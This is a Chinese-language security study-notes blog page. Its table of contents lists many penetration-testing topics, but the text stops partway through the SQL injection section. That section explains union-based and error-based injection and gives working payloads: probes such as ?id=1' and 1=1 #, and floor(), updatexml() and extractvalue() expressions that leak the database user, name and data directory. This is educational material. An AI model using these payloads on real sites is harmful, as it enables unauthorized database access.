<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    
    <link rel="apple-touch-icon" sizes="76x76" href="/null">
    <link rel="icon" type="image/png" href="/null">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <title>学习笔记 - blckder02&#39;s blog</title>
    
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    
    
    <meta name="description" content="">
    <meta name="author" content="blckder02">
    <meta name="keywords" content="">
    <style>


    
    :root{
        --shadow-color: rgba(0,0,0,0.2);
        --sec-shadow: rgba(0,0,0,0.03);
        --shadow-hover-color: rgba(0,0,0,0.28);
        --first-text-color: #475b6d;
        --second-text-color: #37475b;
        --third-text-color: #858585;
        --default-text-color: #505050;
        --default-link-color: #007bff;
        --link-color: #000000;
        --second-link-color: #4F9BFA;
        --code-color:rgba(27,31,35,.05);
        --post-bkg-color: #fff;
        --page-bkg-color: #f2f5f8;
        --nav-a-hover-color: #3498db;
        --post-sec-text-color: #718096;
        --sec-bkg: #f2f5f8;
        --color-mode: 'light';
        --bkg-h: rgba(255,255,255,0.6);
        --bkg-m: #e1e4e8;
        --home-title-color: #4169E1;
        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
        --hr-color: #ddd;
        --bg-t: #f4f4f4;
        --nav-bkg: rgba(255,255,255,0.6);
    }

@media (prefers-color-scheme: dark) {
  :root {
    --color-mode: 'dark';
  }

  :root:not([data-theme]) {
    --first-text-color: hsla(0,0%,100%,0.92);
    --second-text-color: hsla(0,0%,100%,0.86);
    --third-text-color: #a7a9ad;
    --default-text-color: #505050;
    --default-link-color: #1589e9;
    --link-color: #000000;
    --second-link-color: #30a9de;
    --post-bkg-color: #252d38;
    --page-bkg-color: #181c27;
    --nav-a-hover-color: #3498db;
    --post-sec-text-color: #a7a9ad;
    --sec-bkg: #364151;
    --bkg-h: rgba(255,255,255,0.2);
    --bkg-m: rgba(255,255,255,0.1);
    --home-title-color: rgb(226, 82, 90);
    --code-color:#3e4b5e;
    --shadow: none;
    --hr-color: #718096;
    --bg-t: #364151;
    --nav-bkg: rgba(13,17,23,0.6);
  }
}

[data-theme='dark'] {
    --shadow-color: rgba(0,0,0,0.2);
    --shadow-hover-color: rgba(0,0,0,0.28);
    --first-text-color: hsla(0,0%,100%,0.92);
    --second-text-color: hsla(0,0%,100%,0.86);
    --third-text-color: #a7a9ad;
    --default-text-color: #505050;
    --default-link-color: #1589e9;
    --link-color: #000000;
    --second-link-color: #30a9de;
    --post-bkg-color: #252d38;
    --page-bkg-color: #181c27;
    --nav-a-hover-color: #3498db;
    --post-sec-text-color: #a7a9ad;
    --sec-bkg: #364151;
    --bkg-h: rgba(255,255,255,0.2);
    --bkg-m: rgba(255,255,255,0.1);
    --home-title-color: rgb(226, 82, 90);
    --code-color:#3e4b5e;
    --shadow: none;
    --hr-color: #718096;
    --bg-t: #364151;
    --nav-bkg: rgba(13,17,23,0.6);
}

</style>



<style>
#page-main,footer,.p-btn{
    display: none;
}
html,body{
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    overflow-y: overlay;
}
body{
    background-color: var(--page-bkg-color);
    color: var(--second-text-color);
    overflow-y: scroll;
}
a {
    color: var(--default-link-color);
    text-decoration: none;
    background-color: transparent;
}
a:hover{
    color: var(--second-link-color);
}
.main-content,.post-card-main{
    margin: 30px;
}



@media (max-width: 410px){
    .post-card-main{
        max-width: 350px!important;
    }
}

@media (max-width: 980px){
    .post-card-main{
        max-width: 520px!important;
    }
}


@media (min-width: 780px){ 
    h3{
        font-size: 1.5rem;
        line-height: 1.5em;
    }
}
@media (min-width: 1280px){ 
    h3{
        font-size: 1.7rem;
        line-height: 1.5em;
    }
}
@media (min-width: 2096px){ 
    h3{
        font-size: 1.8rem;
        line-height: 1.5em;
    }
}

.text-center{
    text-align: center!important;
}
.middle-center{
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    justify-content: center;
    height: 100%;
}
header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    position: fixed;
    height: 54px;
    padding: 0 1.25rem;
    top: 0;
    left: 0;
    right: 0;
    z-index: 10;
    border-bottom: 1px solid var(--bkg-m);
    background-color: var(--nav-bkg);
}
header .header__left, header .header__right {
    display: flex;
    align-items: center;
    font-family: rubik,sans-serif,Varela Round;
}
header .header__left .logo__text {
    font-size: 18px;
    font-weight: 450;
    padding: 14.5px 10px;
    border-radius: 5px;
    color: var(--second-text-color);
}
header .header__right .navbar__menus {
    height: 54px;
    padding: 0 0 0 15px;
}
header .header__right .button {
    color: var(--second-text-color);
}
header .header__right .navbar__menus .navbar-menu {
    display: inline-block;
    align-items: center;
    height: 54px;
    padding: 0 10px;
    font-size: 16px;
    line-height: 54px;
}
header .header__right .dropdown-icon {
    display: none;
    height: 54px;
    padding: 15px 10px;
    border: 0;
    background-color: transparent;
}
header .header__right .dropdown-menus {
    line-height: 2rem;
    animation: slide-in .15s ease 1;
    display: none;
    position: absolute;
    left: 12px;
    right: 12px;
    top: calc(54px + 10px);
    border-radius: 6px;
    padding: 24px;
    background-color: var(--page-bkg-color);
    border: 1px solid var(--bkg-m);
    z-index: 9999;
    justify-items: center;
    justify-content: center;
    flex-direction: column;
}
header .header__right #btn-search, header .header__right #btn-toggle-dark{
    display: inline-block;
    padding:  18px 10px;
    height: 25px;
}
header .header__right #btn-dropdown{
  display: inline-block;
  padding:  13.5px 0;
}
header .header__right .dropdown-menus .dropdown-menu {
    padding: 10px;
    color: var(--second-text-color);
}
@media screen and (max-width: 764px){
.navbar__menus {
    display: none!important;
}
.dropdown-icon {
    display: inline-block!important;
}
}
.p-btn{
    position: fixed;
    bottom: 1.2rem;
    right: 1.2rem;
    contain: layout;
}
.toc-btn,.click-btn{
    cursor: pointer;
    -webkit-appearance: none;
    -moz-appearance: none;
    appearance: none;
    align-items: center;
    margin-top: .5rem;
    font-size: .75rem;
    background-color: var(--sec-bkg);
    display: block;
    padding: 0.9rem;
    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
    border: none;
    border-radius: 0.5rem;
    line-height: 1;
    color: var(--first-text-color);
}
.toc-link{
    color: var(--second-text-color);
}

#css-loading h3{
    font-weight: 500;
    font-size: 1.4rem;
    text-align: center;
    position: fixed;
    top: 200px;
    left: 0;
    right: 0;
    opacity: 0;
    animation: cssLoad;
    animation-delay: 0.3s;
    -webkit-animation: cssLoad;
    -webkit-animation-delay: 0.3s;
}
@keyframes cssLoad {
    from {
        opacity: 0;
    }
    to {
        opacity: 0.9;
    }
}


.memorial {
    -webkit-filter: grayscale(100%);
    -moz-filter: grayscale(100%);
    -ms-filter: grayscale(100%);
    -o-filter: grayscale(100%);
    filter: grayscale(100%);
    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
}


    .post-copyright:after {
        position: absolute;
        color: #fff;
        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
        content: ' ';
        height: 10rem;
        width: 10rem;
        right: -2rem;
        top: -2rem;
        opacity: .1;
    }

</style>

    

    
        <!--
        <link rel="stylesheet" href="/css/page.css" media="print"
            onload="this.media='all';this.onload=null">
        <noscript>-->
            <link rel="stylesheet" href="/css/page.css">
        <!--</noscript>-->
    
    
    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
    <noscript>
        <link rel="stylesheet" href="/css/main.css">
    </noscript>

    
    <script src="/js/main.js"></script>
    
<meta name="generator" content="Hexo 6.3.0"></head>

    <body>
        <header>
            
<div class="header__left">
	<a href="/" class="button"><span class="logo__text">blckder02</span></a>
</div>
<div class="header__right">
	<div class="navbar__menus">
		
		<a href="/" class="button">
			<div class="navbar-menu">首页</div>
		</a>
		
		<a href="/archives/" class="button">
			<div class="navbar-menu">归档</div>
		</a>
		
		<a href="/categories/" class="button">
			<div class="navbar-menu">分类</div>
		</a>
		
		<a href="/about/" class="button">
			<div class="navbar-menu">关于</div>
		</a>
		
	</div>
	
	<a href="/search/" class="button">
		<div id="btn-search">
			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
				stroke="currentColor" stroke-width="32">
				<path
					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
				</path>
			</svg>
		</div>
	</a>
	
	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
		<div>
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
			</svg>
		</div>
	</a>
	<a href="javaScript:void(0);" class="dropdown-icon button">
		<div id="btn-dropdown">
			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
				stroke="currentColor" stroke-width="32" stroke-linecap="round">
				<path
					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
					fill="currentColor"></path>
			</svg>
		</div>
	</a>
	<div class="dropdown-menus" id="dropdown-menus">
		
		<a href="/" class="dropdown-menu button">首页</a>
		<br>
		
		<a href="/archives/" class="dropdown-menu button">归档</a>
		<br>
		
		<a href="/categories/" class="dropdown-menu button">分类</a>
		<br>
		
		<a href="/about/" class="dropdown-menu button">关于</a>
		<br>
		
	</div>
</div>

        </header>
        <div id="top"></div>
        <div id="page-main" class="main-content">
        <div class="mg-top">
            

<article class="page">
<div id="post-meta-m">
    <div class="post-meta" id="post-meta">
  <h3>学习笔记</h3>
    
      <span class="post-meta-label">
        blckder02
      </span>
    
    
      <span class="post-meta-label">
        <span class="p-dot"></span>
        <time datetime="2022-09-16 15:25" pubdate>
          2022-09-16
        </time>
      </span>
    
    
      
      <span class="post-meta">
        <span class="p-dot"></span>
        共 31.8k 字
      </span>
    
    
    
  </div>
  
</div>
<div class="article-m">
  <div class="post-toc">
    
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">XSS绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-number">3.</span> <span class="toc-text">CSP(内容安全策略)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">CSP绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">CSRF（跨站请求伪造）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E5%BE%A1"><span class="toc-number">4.1.</span> <span class="toc-text">CSRF防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">5.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.</span> <span class="toc-text">SSRF绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">文件上传防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.1.</span> <span class="toc-text">php伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">7.2.</span> <span class="toc-text">文件包含绕过方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">8.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">9.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.</span> <span class="toc-text">XXE漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">9.2.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text">逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">JSONP跨域漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP%E5%8A%AB%E6%8C%81"><span class="toc-number">11.1.</span> <span class="toc-text">JSONP劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS"><span class="toc-number">12.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.1.</span> <span class="toc-text">CORS漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="toc-number">13.</span> <span class="toc-text">渗透测试工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">14.</span> <span class="toc-text">渗透测试流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">14.1.</span> <span class="toc-text">一、信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">14.2.</span> <span class="toc-text">二、提权方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">14.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">14.4.</span> <span class="toc-text">端口转发、端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS5%E4%BB%A3%E7%90%86"><span class="toc-number">14.5.</span> <span class="toc-text">SOCKS5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">14.6.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">14.7.</span> <span class="toc-text">痕迹清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">15.</span> <span class="toc-text">内网渗透流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-number">15.1.</span> <span class="toc-text">Kerberos协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">15.2.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">15.3.</span> <span class="toc-text">白银票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">16.</span> <span class="toc-text">PHP代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.</span> <span class="toc-text">PHP反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">18.</span> <span class="toc-text">PHP漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Laravel"><span class="toc-number">18.1.</span> <span class="toc-text">Laravel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP"><span class="toc-number">18.2.</span> <span class="toc-text">ThinkPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.3.</span> <span class="toc-text">Typecho反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA"><span class="toc-number">18.4.</span> <span class="toc-text">通达OA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS"><span class="toc-number">18.5.</span> <span class="toc-text">CMS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%B0%84"><span class="toc-number">19.</span> <span class="toc-text">Java反射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-RMI"><span class="toc-number">20.</span> <span class="toc-text">Java RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">20.1.</span> <span class="toc-text">RMI反序列化利用：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">21.</span> <span class="toc-text">Java序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-JNDI"><span class="toc-number">22.</span> <span class="toc-text">Java JNDI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">23.</span> <span class="toc-text">Java动态代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-URLDNS"><span class="toc-number">24.</span> <span class="toc-text">Java URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Commons-Collections-1"><span class="toc-number">25.</span> <span class="toc-text">Java Commons Collections 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Commons-Collections-2"><span class="toc-number">26.</span> <span class="toc-text">Java Commons Collections 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-3"><span class="toc-number">27.</span> <span class="toc-text">Commons Collections 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-4"><span class="toc-number">28.</span> <span class="toc-text">Commons Collections 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-5"><span class="toc-number">29.</span> <span class="toc-text">Commons Collections 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-6"><span class="toc-number">30.</span> <span class="toc-text">Commons Collections 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-7"><span class="toc-number">31.</span> <span class="toc-text">Commons Collections 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j2-JNDI-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-44228%EF%BC%89"><span class="toc-number">32.</span> <span class="toc-text">Log4j2 JNDI 注入漏洞分析（CVE-2021-44228）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring"><span class="toc-number">33.</span> <span class="toc-text">Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IoC"><span class="toc-number">33.1.</span> <span class="toc-text">IoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AOP"><span class="toc-number">33.2.</span> <span class="toc-text">AOP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-MVC"><span class="toc-number">34.</span> <span class="toc-text">Spring MVC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SRC"><span class="toc-number">35.</span> <span class="toc-text">SRC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-number">36.</span> <span class="toc-text">扫描器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#portscanner"><span class="toc-number">36.1.</span> <span class="toc-text">portscanner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#varscanner"><span class="toc-number">36.2.</span> <span class="toc-text">varscanner</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C"><span class="toc-number">37.</span> <span class="toc-text">计算机网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B"><span class="toc-number">37.1.</span> <span class="toc-text">HTTPS握手过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE"><span class="toc-number">37.2.</span> <span class="toc-text">应用层协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%A6"><span class="toc-number">38.</span> <span class="toc-text">密码学</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86"><span class="toc-number">39.</span> <span class="toc-text">工具原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#oneforall"><span class="toc-number">39.1.</span> <span class="toc-text">oneforall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rad"><span class="toc-number">39.2.</span> <span class="toc-text">Rad</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Classloader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">40.</span> <span class="toc-text">Classloader类加载机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDBC"><span class="toc-number">41.</span> <span class="toc-text">JDBC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0"><span class="toc-number">41.1.</span> <span class="toc-text">数据库连接池</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">42.</span> <span class="toc-text">CTF</span></a></li></ol>
    
  </div>
    <div id="article">
      <div id="post-content" class="markdown-body textretty">
        <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><ol>
<li>概述：SQL注入就是一些web应用程序将前端用户可控的参数传入后端，带入数据库查询的操作；造成SQL注入的基本原因是没有对用户传入参数的合法性进行严格的判断，以至于攻击者可以构造任意SQL语句对数据库进行操作。</li>
<li>SQL注入漏洞产生的条件？<br>  参数用户可控：前端传给后端的参数内容是用户可以控制的；<br>  参数带入了数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。<br>  (所以开发者最好不要完全相信外部输入的参数)<br><strong>一、 union注入</strong></li>
<li>判断是数字型还是字符型：</li>
</ol>
<ul>
<li><p>根据<code>?id=1 and 1=1</code>和<code>?id=1 and 1=2</code>判断是否为数字型，返回不同则为数字型<br>  <img src="/./images/1625804045086.png" alt="enter description here">[sql-1]</p>
</li>
<li><p>根据<code>?id=1&#39; and 1=1 #</code>和<code>?id=1&#39; and 1=2 #</code>判断是否为字符型，返回不同则为字符型</p>
</li>
</ul>
<ol start="2">
<li>原理：将union左边的语句报错，则会显示union右边我们执行的查询语句</li>
<li>常用语句：order by、union select、group_concat()</li>
<li>代码层面：是否将查询到的数据输出到页面</li>
<li>(使用union注入要写成?id&#x3D;-1，即id不存在)</li>
</ol>
<p><strong>二、报错注入</strong></p>
<ol>
<li>概述：在注入过程中根据回显的报错信息进行判断。</li>
<li>常用报错函数：<code>floor()</code>、<code>updatexml()</code>、<code>extractvalue()</code>。</li>
<li>**floor()**：</li>
</ol>
<ul>
<li><code>floor()</code>返回小于等于该值的最大整数，可以理解为向下取整，只保留整数部分</li>
<li><code>floor(rand(0)*2)</code>根据参数x有规律的随机生成0和1，以使每次注入都稳定报错</li>
<li><code>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></li>
<li>当配合group by使用时，如果查询的内容不存在，则会新建，但是在新建的过程中rand又进行了一次计算，所以插入的是第二次计算的值，那么在后面如果查询到不存在的值，已经准备新建一个值了，但是经过第二次rand计算后，插入的则是第二次计算的值，如果这个值已经存在，就会出现报错。</li>
</ul>
<ol start="4">
<li>updatexml：对XML文档进行修改<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br><code>?id=1&#39; and updatexml (1,concat(0x7e,database(),0x7e),1) --+</code><br>extractvalue：从目标XML中返回包含所查询值的字符串<br><code>EXTRACTVALUE (XML_document, XPath_string); </code><br><code>and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));</code></li>
<li>updatexml和extractvalue报错原理：<br>都是第二个参数必须是Xpath格式的字符串，而我们使用的concat()函数，不符合Xpath格式，所以会出现格式错误</li>
